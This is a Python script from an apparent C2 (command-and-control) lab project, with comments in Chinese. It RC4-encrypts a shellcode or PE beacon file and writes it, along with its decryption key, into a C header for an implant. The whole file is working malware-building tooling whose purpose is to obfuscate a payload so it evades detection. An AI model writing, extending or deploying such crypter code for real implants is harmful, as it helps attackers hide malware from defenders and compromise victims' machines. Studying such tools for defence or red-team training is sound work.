#!/usr/bin/env python3
"""lab-c2/tools/enc.py - RC4 加密 shellcode/PE, 生成 implant/payload.h

用法: python tools/enc.py build/beacon.bin
"""
import os
import random
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "..", "implant", "payload.h")
KEY = b""


def rc4(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    out = bytearray()
    i = j = 0
    for b in data:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) & 0xFF])
    return bytes(out)


def emit(blob: bytes) -> None:
    lines = [
        "#pragma once",
        "// generated by tools/enc.py - do not edit by hand",
        "",
        "static unsigned char g_shellcode[] = {",
    ]
    for i in range(0, len(blob), 16):
        lines.append("    " + ",".join(f"0x{b:02X}" for b in blob[i:i + 16]) + ",")
    lines.append("};")
    lines.append(f"static const unsigned int g_scLen = {len(blob)};")
    lines.append("")
    lines.append("static unsigned char g_key[] = { " +
                 ",".join(f"0x{b:02X}" for b in KEY) + " };")
    lines.append(f"static const unsigned int g_keyLen = {len(KEY)};")
    lines.append("")
    with open(OUT, "w", encoding="ascii") as f:
        f.write("\n".join(lines))


def main() -> int:
    global KEY  # noqa: PLW0603 - 一次性脚本, 用模块级 KEY 给 emit 读
    src = sys.argv[1] if len(sys.argv) > 1 else os.path.join(HERE, "..", "build", "beacon.bin")
    if not os.path.isfile(src):
        print(f"[-] 找不到 {src}")
        return 1
    KEY = bytes(random.randrange(256) for _ in range(16))
    plain = open(src, "rb").read()
    emit(rc4(plain, KEY))
    print(f"[+] {src} ({len(plain)} 字节) -> implant/payload.h  RC4-128")
    return 0


if __name__ == "__main__":
    sys.exit(main())
